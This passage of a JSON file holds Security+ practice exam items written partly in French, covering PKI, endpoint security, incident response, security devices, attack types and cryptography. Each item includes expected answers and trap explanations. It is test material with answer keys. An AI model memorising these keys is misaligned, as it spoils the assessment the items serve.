    "domain": "General Security Concepts",
    "type": "scenario_tasks",
    "title": "Certificates / PKI matching",
    "difficulty": "simulation",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "6. Mod\u00e8le Messer PBQ - Certificates / PKI matching\nInspiration Messer\n\nDans l'examen B, un PBQ demande d'associer des \u00e9l\u00e9ments PKI comme CRL, OCSP, CA, CSR \u00e0 leurs fonctions. Le corrig\u00e9 indique par exemple que la CRL est une liste de certificats r\u00e9voqu\u00e9s, que le CSR envoie la cl\u00e9 publique \u00e0 signer, que la CA g\u00e8re les certificats, et qu'OCSP permet au navigateur de v\u00e9rifier le statut de r\u00e9vocation.\n\nObjectif p\u00e9dagogique\n\nTester PKI et r\u00e9vocation.\n\nInterface\n\nType : matching\n\nPKI item\tFunction\nCRL\tDropdown\nOCSP\tDropdown\nCA\tDropdown\nCSR\tDropdown\nBanque de fonctions\nList of revoked certificates\nReal-time certificate status check\nIssues and manages certificates\nRequest sent to have a public key signed",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [
      "1.4"
    ],
    "tasks": [
      {
        "id": "messer-scenario-006-task-1",
        "kind": "matching",
        "title": "Certificates / PKI matching",
        "prompt": "6. Mod\u00e8le Messer PBQ - Certificates / PKI matching\nInspiration Messer\n\nDans l'examen B, un PBQ demande d'associer des \u00e9l\u00e9ments PKI comme CRL, OCSP, CA, CSR \u00e0 leurs fonctions. Le corrig\u00e9 indique par exemple que la CRL est une liste de certificats r\u00e9voqu\u00e9s, que le CSR envoie la cl\u00e9 publique \u00e0 signer, que la CA g\u00e8re les certificats, et qu'OCSP permet au navigateur de v\u00e9rifier le statut de r\u00e9vocation.\n\nObjectif p\u00e9dagogique\n\nTester PKI et r\u00e9vocation.\n\nInterface\n\nType : matching\n\nPKI item\tFunction\nCRL\tDropdown\nOCSP\tDropdown\nCA\tDropdown\nCSR\tDropdown\nBanque de fonctions\nList of revoked certificates\nReal-time certificate status check\nIssues and manages certificates\nRequest sent to have a public key signed",
        "options": [],
        "expectedAnswers": [
          "Item\tFonction",
          "CRL\tList of revoked certificates",
          "OCSP\tReal-time certificate status check",
          "CA\tIssues and manages certificates",
          "CSR\tRequest sent to have a public key signed",
          "Variante JSON",
          "{",
          "\"id\": \"pbq-pki-match-001\",",
          "\"type\": \"matching\",",
          "\"domain\": \"1.4\",",
          "\"items\": [\"CRL\", \"OCSP\", \"CA\", \"CSR\"],",
          "\"targets\": [",
          "\"List of revoked certificates\",",
          "\"Real-time certificate status check\",",
          "\"Issues and manages certificates\",",
          "\"Request sent to have a public key signed\"",
          "]",
          "}"
        ],
        "explanation": "6. Mod\u00e8le Messer PBQ - Certificates / PKI matching\nInspiration Messer\n\nDans l'examen B, un PBQ demande d'associer des \u00e9l\u00e9ments PKI comme CRL, OCSP, CA, CSR \u00e0 leurs fonctions. Le corrig\u00e9 indique par exemple que la CRL est une liste de certificats r\u00e9voqu\u00e9s, que le CSR envoie la cl\u00e9 publique \u00e0 signer, que la CA g\u00e8re les certificats, et qu'OCSP permet au navigateur de v\u00e9rifier le statut de r\u00e9vocation.\n\nObjectif p\u00e9dagogique\n\nTester PKI et r\u00e9vocation.\n\nInterface\n\nType : matching\n\nPKI item\tFunction\nCRL\tDropdown\nOCSP\tDropdown\nCA\tDropdown\nCSR\tDropdown\nBanque de fonctions\nList of revoked certificates\nReal-time certificate status check\nIssues and manages certificates\nRequest sent to have a public key signed\nR\u00e9ponses attendues\nItem\tFonction\nCRL\tList of revoked certificates\nOCSP\tReal-time certificate status check\nCA\tIssues and manages certificates\nCSR\tRequest sent to have a public key signed\nVariante JSON\n{\n  \"id\": \"pbq-pki-match-001\",\n  \"type\": \"matching\",\n  \"domain\": \"1.4\",\n  \"items\": [\"CRL\", \"OCSP\", \"CA\", \"CSR\"],\n  \"targets\": [\n    \"List of revoked certificates\",\n    \"Real-time certificate status check\",\n    \"Issues and manages certificates\",\n    \"Request sent to have a public key signed\"\n  ]\n}\nPi\u00e8ges\nConfusion\tCorrection\nCRL vs OCSP\tCRL = liste ; OCSP = v\u00e9rification en ligne.\nCSR vs certificate\tCSR n'est pas le certificat final ; c'est la demande.\nCA vs RA\tCA signe/\u00e9met ; RA v\u00e9rifie identit\u00e9.\nPublic key vs private key\tLe CSR contient la cl\u00e9 publique, pas la cl\u00e9 priv\u00e9e.",
        "traps": [
          "Confusion\tCorrection",
          "CRL vs OCSP\tCRL = liste ; OCSP = v\u00e9rification en ligne.",
          "CSR vs certificate\tCSR n'est pas le certificat final ; c'est la demande.",
          "CA vs RA\tCA signe/\u00e9met ; RA v\u00e9rifie identit\u00e9.",
          "Public key vs private key\tLe CSR contient la cl\u00e9 publique, pas la cl\u00e9 priv\u00e9e."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-007",
    "domain": "Security Operations",
    "type": "scenario_tasks",
    "title": "S\u00e9curit\u00e9 endpoint : desktop vs tablet/mobile",
    "difficulty": "simulation",
    "timeLimitSeconds": 420,
    "role": "Security+ Candidate",
    "scenario": "A company deploys a sensitive customer application to:\n\ncorporate desktops using a browser front-end;\ntablets used by field sales users.\n\nTwo forms of authentication are required for access. Select the BEST security features for each platform. Not all features are used.\n\nR\u00e9ponse attendue\nPlateforme\tContr\u00f4les recommand\u00e9s\nDesktop\tAnti-malware, host-based firewall\nTablet/mobile\tMDM integration, full device encryption, biometric authentication",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [],
    "tasks": [
      {
        "id": "messer-scenario-007-task-1",
        "kind": "table_completion",
        "title": "S\u00e9curit\u00e9 endpoint : desktop vs tablet/mobile",
        "prompt": "A company deploys a sensitive customer application to:\n\ncorporate desktops using a browser front-end;\ntablets used by field sales users.\n\nTwo forms of authentication are required for access. Select the BEST security features for each platform. Not all features are used.\n\nR\u00e9ponse attendue\nPlateforme\tContr\u00f4les recommand\u00e9s\nDesktop\tAnti-malware, host-based firewall\nTablet/mobile\tMDM integration, full device encryption, biometric authentication",
        "options": [],
        "expectedAnswers": [],
        "explanation": "7. Mod\u00e8le Messer PBQ - S\u00e9curit\u00e9 endpoint : desktop vs tablet/mobile\nInspiration Messer\n\nDans l'examen B, un PBQ demande de choisir les meilleures fonctions de s\u00e9curit\u00e9 pour une application utilis\u00e9e sur tablets en mobilit\u00e9 et sur desktop avec front-end navigateur. Les options incluent notamment anti-malware, host-based firewall, MDM integration, full device encryption, biometric authentication. Le corrig\u00e9 associe les besoins mobiles \u00e0 MDM, chiffrement complet et biom\u00e9trie, tandis que le desktop re\u00e7oit plut\u00f4t host firewall et anti-malware.\n\nObjectif p\u00e9dagogique\n\nTester la diff\u00e9rence entre s\u00e9curit\u00e9 mobile et s\u00e9curit\u00e9 poste fixe.\n\nInterface\n\nType : multi-select par plateforme\n\nSecurity Feature\tDesktop\tTablet\nAnti-malware\tcheckbox\tcheckbox\nHost-based firewall\tcheckbox\tcheckbox\nMDM integration\tcheckbox\tcheckbox\nFull device encryption\tcheckbox\tcheckbox\nBiometric authentication\tcheckbox\tcheckbox\nOSINT\tcheckbox\tcheckbox\nInfrared sensor\tcheckbox\tcheckbox\nPrompt original\n\nA company deploys a sensitive customer application to:\n\ncorporate desktops using a browser front-end;\ntablets used by field sales users.\n\nTwo forms of authentication are required for access. Select the BEST security features for each platform. Not all features are used.\n\nR\u00e9ponse attendue\nPlateforme\tContr\u00f4les recommand\u00e9s\nDesktop\tAnti-malware, host-based firewall\nTablet/mobile\tMDM integration, full device encryption, biometric authentication\nScoring\n\u00c9l\u00e9ment\tPoints\nAnti-malware sur desktop\t+10\nHost firewall sur desktop\t+10\nMDM sur tablet\t+20\nFull device encryption sur tablet\t+20\nBiometric auth sur tablet\t+20\n\u00c9viter OSINT/infrared sensor\t+20\nPi\u00e8ges\nPi\u00e8ge\tPourquoi\nOSINT comme contr\u00f4le endpoint\tOSINT est une source de renseignement, pas une s\u00e9curit\u00e9 locale.\nInfrared sensor\tContr\u00f4le physique/senseur, pas contr\u00f4le app mobile.\nPas de chiffrement sur tablet\tGrave erreur : appareil mobile = risque perte/vol.\nMDM sur desktop classique\tPossible dans certains environnements, mais moins \"BEST\" que pour tablette mobile.",
        "traps": [
          "Pi\u00e8ge\tPourquoi",
          "OSINT comme contr\u00f4le endpoint\tOSINT est une source de renseignement, pas une s\u00e9curit\u00e9 locale.",
          "Infrared sensor\tContr\u00f4le physique/senseur, pas contr\u00f4le app mobile.",
          "Pas de chiffrement sur tablet\tGrave erreur : appareil mobile = risque perte/vol.",
          "MDM sur desktop classique\tPossible dans certains environnements, mais moins \"BEST\" que pour tablette mobile."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-008",
    "domain": "Security Operations",
    "type": "scenario_tasks",
    "title": "Incident Response ordering",
    "difficulty": "simulation",
    "timeLimitSeconds": 420,
    "role": "Security+ Candidate",
    "scenario": "8. Mod\u00e8le Messer PBQ - Incident Response ordering\nInspiration Messer\n\nDans l'examen B, un PBQ demande de placer les activit\u00e9s de r\u00e9ponse \u00e0 incident dans le bon ordre. Le corrig\u00e9 commence par Preparation, puis Detection, et explique que Preparation contient les t\u00e2ches avant l'incident, tandis que Detection identifie qu'un incident peut \u00eatre en cours. Les notes Messer rappellent aussi les phases recovery, eradication et lessons learned, avec l'id\u00e9e de supprimer la cause, restaurer et am\u00e9liorer le processus apr\u00e8s l'incident.\n\nObjectif p\u00e9dagogique\n\nTester l'ordre logique IR.\n\nInterface\n\nType : drag-and-drop ordering\n\n\u00c9l\u00e9ments \u00e0 ordonner :\n\nPreparation\nDetection\nAnalysis\nContainment\nEradication\nRecovery\nLessons Learned\nR\u00e9ponse attendue\n1. Preparation\n2. Detection\n3. Analysis\n4. Containment\n5. Eradication\n6. Recovery\n7. Lessons Learned\nVariante plus r\u00e9aliste\n\nAu lieu d'afficher les noms des phases, affiche des actions :\n\nAction\tPhase attendue\nCreate playbooks and collect forensic tools\tPreparation\nSIEM alert is received\tDetection\nDetermine scope and affected hosts\tAnalysis\nIsolate infected workstation\tContainment\nRemove malware and persistence\tEradication\nRestore from clean backup\tRecovery\nUpdate procedures after post-incident meeting\tLessons Learned\nScoring\nCrit\u00e8re\tPoints\nOrdre exact des phases\t70\nActions associ\u00e9es aux bonnes phases\t30\nPi\u00e8ges\nPi\u00e8ge\tPourquoi\nRecovery avant Eradication\tTu risques de restaurer dans un environnement encore infect\u00e9.\nLessons Learned avant Recovery\tLe retour d'exp\u00e9rience vient apr\u00e8s la r\u00e9solution.\nDetection vs Analysis\tDetection = alerte ; Analysis = validation/scope/root cause.\nContainment vs Eradication\tContainment limite ; Eradication supprime.",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [],
    "tasks": [
      {
        "id": "messer-scenario-008-task-1",
        "kind": "ordering",
        "title": "Incident Response ordering",
        "prompt": "8. Mod\u00e8le Messer PBQ - Incident Response ordering\nInspiration Messer\n\nDans l'examen B, un PBQ demande de placer les activit\u00e9s de r\u00e9ponse \u00e0 incident dans le bon ordre. Le corrig\u00e9 commence par Preparation, puis Detection, et explique que Preparation contient les t\u00e2ches avant l'incident, tandis que Detection identifie qu'un incident peut \u00eatre en cours. Les notes Messer rappellent aussi les phases recovery, eradication et lessons learned, avec l'id\u00e9e de supprimer la cause, restaurer et am\u00e9liorer le processus apr\u00e8s l'incident.\n\nObjectif p\u00e9dagogique\n\nTester l'ordre logique IR.\n\nInterface\n\nType : drag-and-drop ordering\n\n\u00c9l\u00e9ments \u00e0 ordonner :\n\nPreparation\nDetection\nAnalysis\nContainment\nEradication\nRecovery\nLessons Learned\nR\u00e9ponse attendue\n1. Preparation\n2. Detection\n3. Analysis\n4. Containment\n5. Eradication\n6. Recovery\n7. Lessons Learned\nVariante plus r\u00e9aliste\n\nAu lieu d'afficher les noms des phases, affiche des actions :\n\nAction\tPhase attendue\nCreate playbooks and collect forensic tools\tPreparation\nSIEM alert is received\tDetection\nDetermine scope and affected hosts\tAnalysis\nIsolate infected workstation\tContainment\nRemove malware and persistence\tEradication\nRestore from clean backup\tRecovery\nUpdate procedures after post-incident meeting\tLessons Learned\nScoring\nCrit\u00e8re\tPoints\nOrdre exact des phases\t70\nActions associ\u00e9es aux bonnes phases\t30\nPi\u00e8ges\nPi\u00e8ge\tPourquoi\nRecovery avant Eradication\tTu risques de restaurer dans un environnement encore infect\u00e9.\nLessons Learned avant Recovery\tLe retour d'exp\u00e9rience vient apr\u00e8s la r\u00e9solution.\nDetection vs Analysis\tDetection = alerte ; Analysis = validation/scope/root cause.\nContainment vs Eradication\tContainment limite ; Eradication supprime.",
        "options": [],
        "expectedAnswers": [],
        "explanation": "8. Mod\u00e8le Messer PBQ - Incident Response ordering\nInspiration Messer\n\nDans l'examen B, un PBQ demande de placer les activit\u00e9s de r\u00e9ponse \u00e0 incident dans le bon ordre. Le corrig\u00e9 commence par Preparation, puis Detection, et explique que Preparation contient les t\u00e2ches avant l'incident, tandis que Detection identifie qu'un incident peut \u00eatre en cours. Les notes Messer rappellent aussi les phases recovery, eradication et lessons learned, avec l'id\u00e9e de supprimer la cause, restaurer et am\u00e9liorer le processus apr\u00e8s l'incident.\n\nObjectif p\u00e9dagogique\n\nTester l'ordre logique IR.\n\nInterface\n\nType : drag-and-drop ordering\n\n\u00c9l\u00e9ments \u00e0 ordonner :\n\nPreparation\nDetection\nAnalysis\nContainment\nEradication\nRecovery\nLessons Learned\nR\u00e9ponse attendue\n1. Preparation\n2. Detection\n3. Analysis\n4. Containment\n5. Eradication\n6. Recovery\n7. Lessons Learned\nVariante plus r\u00e9aliste\n\nAu lieu d'afficher les noms des phases, affiche des actions :\n\nAction\tPhase attendue\nCreate playbooks and collect forensic tools\tPreparation\nSIEM alert is received\tDetection\nDetermine scope and affected hosts\tAnalysis\nIsolate infected workstation\tContainment\nRemove malware and persistence\tEradication\nRestore from clean backup\tRecovery\nUpdate procedures after post-incident meeting\tLessons Learned\nScoring\nCrit\u00e8re\tPoints\nOrdre exact des phases\t70\nActions associ\u00e9es aux bonnes phases\t30\nPi\u00e8ges\nPi\u00e8ge\tPourquoi\nRecovery avant Eradication\tTu risques de restaurer dans un environnement encore infect\u00e9.\nLessons Learned avant Recovery\tLe retour d'exp\u00e9rience vient apr\u00e8s la r\u00e9solution.\nDetection vs Analysis\tDetection = alerte ; Analysis = validation/scope/root cause.\nContainment vs Eradication\tContainment limite ; Eradication supprime.",
        "traps": [
          "Pi\u00e8ge\tPourquoi",
          "Recovery avant Eradication\tTu risques de restaurer dans un environnement encore infect\u00e9.",
          "Lessons Learned avant Recovery\tLe retour d'exp\u00e9rience vient apr\u00e8s la r\u00e9solution.",
          "Detection vs Analysis\tDetection = alerte ; Analysis = validation/scope/root cause.",
          "Containment vs Eradication\tContainment limite ; Eradication supprime."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-009",
    "domain": "Threats, Vulnerabilities, and Mitigations",
    "type": "scenario_tasks",
    "title": "Network/security devices matching",
    "difficulty": "simulation",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "9. Mod\u00e8le Messer PBQ - Network/security devices matching\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'associer des dispositifs comme WAF, proxy server, load balancer, sensor, MDM, router, jump server, IPS \u00e0 des descriptions comme bloquer SQL injection, intercepter/cacher les requ\u00eates navigateur, router entre VLAN, g\u00e9rer des serveurs web redondants, etc.\n\nObjectif p\u00e9dagogique\n\nTester le r\u00f4le des appliances et outils de s\u00e9curit\u00e9.\n\nInterface\n\nType : matching\n\nDescription\tDevice\nBlocks SQL injection against a public web application\tDropdown\nIntercepts browser requests and caches responses\tDropdown\nRoutes traffic between VLANs\tDropdown\nDistributes traffic across redundant web servers\tDropdown\nProvides secure administrative access to internal servers\tDropdown\nManages mobile device policies\tDropdown\nBanque d'options\nWAF\nProxy server\nRouter\nLoad balancer\nJump server\nMDM\nSensor\nIPS",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [],
    "tasks": [
      {
        "id": "messer-scenario-009-task-1",
        "kind": "matching",
        "title": "Network/security devices matching",
        "prompt": "9. Mod\u00e8le Messer PBQ - Network/security devices matching\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'associer des dispositifs comme WAF, proxy server, load balancer, sensor, MDM, router, jump server, IPS \u00e0 des descriptions comme bloquer SQL injection, intercepter/cacher les requ\u00eates navigateur, router entre VLAN, g\u00e9rer des serveurs web redondants, etc.\n\nObjectif p\u00e9dagogique\n\nTester le r\u00f4le des appliances et outils de s\u00e9curit\u00e9.\n\nInterface\n\nType : matching\n\nDescription\tDevice\nBlocks SQL injection against a public web application\tDropdown\nIntercepts browser requests and caches responses\tDropdown\nRoutes traffic between VLANs\tDropdown\nDistributes traffic across redundant web servers\tDropdown\nProvides secure administrative access to internal servers\tDropdown\nManages mobile device policies\tDropdown\nBanque d'options\nWAF\nProxy server\nRouter\nLoad balancer\nJump server\nMDM\nSensor\nIPS",
        "options": [],
        "expectedAnswers": [
          "Description\tDevice",
          "Blocks SQL injection\tWAF",
          "Caches browser traffic\tProxy server",
          "Routes between VLANs\tRouter",
          "Redundant web servers\tLoad balancer",
          "Secure admin intermediary\tJump server",
          "Mobile policy management\tMDM",
          "Detects/collects traffic\tSensor",
          "Blocks malicious traffic inline\tIPS"
        ],
        "explanation": "9. Mod\u00e8le Messer PBQ - Network/security devices matching\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'associer des dispositifs comme WAF, proxy server, load balancer, sensor, MDM, router, jump server, IPS \u00e0 des descriptions comme bloquer SQL injection, intercepter/cacher les requ\u00eates navigateur, router entre VLAN, g\u00e9rer des serveurs web redondants, etc.\n\nObjectif p\u00e9dagogique\n\nTester le r\u00f4le des appliances et outils de s\u00e9curit\u00e9.\n\nInterface\n\nType : matching\n\nDescription\tDevice\nBlocks SQL injection against a public web application\tDropdown\nIntercepts browser requests and caches responses\tDropdown\nRoutes traffic between VLANs\tDropdown\nDistributes traffic across redundant web servers\tDropdown\nProvides secure administrative access to internal servers\tDropdown\nManages mobile device policies\tDropdown\nBanque d'options\nWAF\nProxy server\nRouter\nLoad balancer\nJump server\nMDM\nSensor\nIPS\nR\u00e9ponses attendues\nDescription\tDevice\nBlocks SQL injection\tWAF\nCaches browser traffic\tProxy server\nRoutes between VLANs\tRouter\nRedundant web servers\tLoad balancer\nSecure admin intermediary\tJump server\nMobile policy management\tMDM\nDetects/collects traffic\tSensor\nBlocks malicious traffic inline\tIPS\nPi\u00e8ges\nConfusion\tCorrection\nWAF vs firewall\tWAF prot\u00e8ge couche application web.\nProxy vs reverse proxy\tProxy client/cache ; reverse proxy prot\u00e8ge serveurs.\nRouter vs switch\tRouter s\u00e9pare r\u00e9seaux/VLANs ; switch connecte couche 2.\nIPS vs sensor\tIPS bloque ; sensor observe/d\u00e9tecte.\nLoad balancer vs clustering\tLoad balancer distribue le trafic vers plusieurs serveurs.",
        "traps": [
          "Confusion\tCorrection",
          "WAF vs firewall\tWAF prot\u00e8ge couche application web.",
          "Proxy vs reverse proxy\tProxy client/cache ; reverse proxy prot\u00e8ge serveurs.",
          "Router vs switch\tRouter s\u00e9pare r\u00e9seaux/VLANs ; switch connecte couche 2.",
          "IPS vs sensor\tIPS bloque ; sensor observe/d\u00e9tecte.",
          "Load balancer vs clustering\tLoad balancer distribue le trafic vers plusieurs serveurs."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-010",
    "domain": "Threats, Vulnerabilities, and Mitigations",
    "type": "scenario_tasks",
    "title": "Attack characteristics matching",
    "difficulty": "simulation",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "10. Mod\u00e8le Messer PBQ - Attack characteristics matching\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'associer des caract\u00e9ristiques \u00e0 des attaques comme DDoS, Replay, Rootkit, Phishing, Brute force, Injection. Le corrig\u00e9 rappelle notamment qu'un rootkit cherche \u00e0 rester cach\u00e9, qu'une brute force tente une liste de mots de passe avec un username connu, et qu'une injection ajoute des donn\u00e9es/code dans l'entr\u00e9e d'une application.\n\nObjectif p\u00e9dagogique\n\nReconna\u00eetre l'attaque par sympt\u00f4me.\n\nInterface\n\nType : matching\n\nCharacteristic\tAttack type\nWebsite stops responding to normal users\tDropdown\nCaptured data is resent to a server\tDropdown\nMalware hides itself on the system\tDropdown\nEmail link requests credentials\tDropdown\nMany passwords tried against one account\tDropdown\nExtra code added as app input\tDropdown",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [],
    "tasks": [
      {
        "id": "messer-scenario-010-task-1",
        "kind": "matching",
        "title": "Attack characteristics matching",
        "prompt": "10. Mod\u00e8le Messer PBQ - Attack characteristics matching\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'associer des caract\u00e9ristiques \u00e0 des attaques comme DDoS, Replay, Rootkit, Phishing, Brute force, Injection. Le corrig\u00e9 rappelle notamment qu'un rootkit cherche \u00e0 rester cach\u00e9, qu'une brute force tente une liste de mots de passe avec un username connu, et qu'une injection ajoute des donn\u00e9es/code dans l'entr\u00e9e d'une application.\n\nObjectif p\u00e9dagogique\n\nReconna\u00eetre l'attaque par sympt\u00f4me.\n\nInterface\n\nType : matching\n\nCharacteristic\tAttack type\nWebsite stops responding to normal users\tDropdown\nCaptured data is resent to a server\tDropdown\nMalware hides itself on the system\tDropdown\nEmail link requests credentials\tDropdown\nMany passwords tried against one account\tDropdown\nExtra code added as app input\tDropdown",
        "options": [],
        "expectedAnswers": [
          "Characteristic\tAttack",
          "Website unavailable due to flood\tDDoS",
          "Captured data retransmitted\tReplay",
          "Hidden malware\tRootkit",
          "Fake login link\tPhishing",
          "Password list against username\tBrute force",
          "Extra code/input\tInjection"
        ],
        "explanation": "10. Mod\u00e8le Messer PBQ - Attack characteristics matching\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'associer des caract\u00e9ristiques \u00e0 des attaques comme DDoS, Replay, Rootkit, Phishing, Brute force, Injection. Le corrig\u00e9 rappelle notamment qu'un rootkit cherche \u00e0 rester cach\u00e9, qu'une brute force tente une liste de mots de passe avec un username connu, et qu'une injection ajoute des donn\u00e9es/code dans l'entr\u00e9e d'une application.\n\nObjectif p\u00e9dagogique\n\nReconna\u00eetre l'attaque par sympt\u00f4me.\n\nInterface\n\nType : matching\n\nCharacteristic\tAttack type\nWebsite stops responding to normal users\tDropdown\nCaptured data is resent to a server\tDropdown\nMalware hides itself on the system\tDropdown\nEmail link requests credentials\tDropdown\nMany passwords tried against one account\tDropdown\nExtra code added as app input\tDropdown\nR\u00e9ponses attendues\nCharacteristic\tAttack\nWebsite unavailable due to flood\tDDoS\nCaptured data retransmitted\tReplay\nHidden malware\tRootkit\nFake login link\tPhishing\nPassword list against username\tBrute force\nExtra code/input\tInjection\nPi\u00e8ges\nConfusion\tCorrection\nBrute force vs spraying\tBrute force = plusieurs mots de passe sur un compte.\nReplay vs on-path\tReplay r\u00e9utilise ; on-path intercepte.\nInjection vs phishing\tInjection cible l'app ; phishing cible l'humain.\nDDoS vs resource consumption bug\tDDoS vient d'un trafic massif/multiple.",
        "traps": [
          "Confusion\tCorrection",
          "Brute force vs spraying\tBrute force = plusieurs mots de passe sur un compte.",
          "Replay vs on-path\tReplay r\u00e9utilise ; on-path intercepte.",
          "Injection vs phishing\tInjection cible l'app ; phishing cible l'humain.",
          "DDoS vs resource consumption bug\tDDoS vient d'un trafic massif/multiple."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-011",
    "domain": "Security Architecture",
    "type": "scenario_tasks",
    "title": "Cryptography matching",
    "difficulty": "simulation",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
    "scenario": "11. Mod\u00e8le Messer PBQ - Cryptography matching\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'associer des technologies cryptographiques : salting, steganography, masking, asymmetric, collision, key stretching \u00e0 leurs descriptions. Le corrig\u00e9 explique par exemple que key stretching utilise plusieurs processus pour renforcer une cl\u00e9, steganography cache des donn\u00e9es dans un autre m\u00e9dia, collision signifie que deux entr\u00e9es produisent le m\u00eame hash, masking cache les donn\u00e9es sensibles, asymmetric utilise des cl\u00e9s diff\u00e9rentes, et salting ajoute de l'information pour rendre un hash unique.\n\nObjectif p\u00e9dagogique\n\nTester les concepts crypto souvent confondus.\n\nInterface\n\nType : matching\n\nDescription\tCrypto concept\nInformation is added to make password hashes unique\tDropdown\nData is hidden inside another media file\tDropdown\nSensitive data is hidden from view\tDropdown\nDifferent keys are used for encryption and decryption\tDropdown\nDifferent inputs produce the same hash\tDropdown\nMultiple hashing steps make cracking slower\tDropdown",
    "objective": "Complete the PBQ scenario tasks and compare against the expected answer.",
    "source": "Messer PBQs local import",
    "skills": [],
    "tasks": [
      {
        "id": "messer-scenario-011-task-1",
        "kind": "matching",
        "title": "Cryptography matching",
        "prompt": "11. Mod\u00e8le Messer PBQ - Cryptography matching\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'associer des technologies cryptographiques : salting, steganography, masking, asymmetric, collision, key stretching \u00e0 leurs descriptions. Le corrig\u00e9 explique par exemple que key stretching utilise plusieurs processus pour renforcer une cl\u00e9, steganography cache des donn\u00e9es dans un autre m\u00e9dia, collision signifie que deux entr\u00e9es produisent le m\u00eame hash, masking cache les donn\u00e9es sensibles, asymmetric utilise des cl\u00e9s diff\u00e9rentes, et salting ajoute de l'information pour rendre un hash unique.\n\nObjectif p\u00e9dagogique\n\nTester les concepts crypto souvent confondus.\n\nInterface\n\nType : matching\n\nDescription\tCrypto concept\nInformation is added to make password hashes unique\tDropdown\nData is hidden inside another media file\tDropdown\nSensitive data is hidden from view\tDropdown\nDifferent keys are used for encryption and decryption\tDropdown\nDifferent inputs produce the same hash\tDropdown\nMultiple hashing steps make cracking slower\tDropdown",
        "options": [],
        "expectedAnswers": [
          "Description\tConcept",
          "Added data for unique hash\tSalting",
          "Hidden in media\tSteganography",
          "Hidden from view\tMasking",
          "Different encrypt/decrypt keys\tAsymmetric",
          "Same hash from different inputs\tCollision",
          "Multiple processes/hashing\tKey stretching"
        ],
        "explanation": "11. Mod\u00e8le Messer PBQ - Cryptography matching\nInspiration Messer\n\nDans l'examen C, un PBQ demande d'associer des technologies cryptographiques : salting, steganography, masking, asymmetric, collision, key stretching \u00e0 leurs descriptions. Le corrig\u00e9 explique par exemple que key stretching utilise plusieurs processus pour renforcer une cl\u00e9, steganography cache des donn\u00e9es dans un autre m\u00e9dia, collision signifie que deux entr\u00e9es produisent le m\u00eame hash, masking cache les donn\u00e9es sensibles, asymmetric utilise des cl\u00e9s diff\u00e9rentes, et salting ajoute de l'information pour rendre un hash unique.\n\nObjectif p\u00e9dagogique\n\nTester les concepts crypto souvent confondus.\n\nInterface\n\nType : matching\n\nDescription\tCrypto concept\nInformation is added to make password hashes unique\tDropdown\nData is hidden inside another media file\tDropdown\nSensitive data is hidden from view\tDropdown\nDifferent keys are used for encryption and decryption\tDropdown\nDifferent inputs produce the same hash\tDropdown\nMultiple hashing steps make cracking slower\tDropdown\nR\u00e9ponses attendues\nDescription\tConcept\nAdded data for unique hash\tSalting\nHidden in media\tSteganography\nHidden from view\tMasking\nDifferent encrypt/decrypt keys\tAsymmetric\nSame hash from different inputs\tCollision\nMultiple processes/hashing\tKey stretching\nPi\u00e8ges\nConfusion\tCorrection\nSalting vs key stretching\tSalt rend unique ; stretching ralentit.\nMasking vs encryption\tMasking cache l'affichage ; encryption chiffre.\nSteganography vs encryption\tSteganography cache l'existence ; encryption cache le contenu.\nHash collision vs hash mismatch\tCollision = deux entr\u00e9es diff\u00e9rentes m\u00eame hash.",
        "traps": [
          "Confusion\tCorrection",
          "Salting vs key stretching\tSalt rend unique ; stretching ralentit.",
          "Masking vs encryption\tMasking cache l'affichage ; encryption chiffre.",
          "Steganography vs encryption\tSteganography cache l'existence ; encryption cache le contenu.",
          "Hash collision vs hash mismatch\tCollision = deux entr\u00e9es diff\u00e9rentes m\u00eame hash."
        ],
        "points": 100
      }
    ],
    "scoring": {
      "max": 100,
      "rules": [
        {
          "condition": "expected_answer_reviewed",
          "points": 100
        }
      ],
      "penalties": []
    }
  },
  {
    "id": "messer-scenario-012",
    "domain": "Threats, Vulnerabilities, and Mitigations",
    "type": "scenario_tasks",
    "title": "Best security technology for scenario",
    "difficulty": "simulation",
    "timeLimitSeconds": 300,
    "role": "Security+ Candidate",
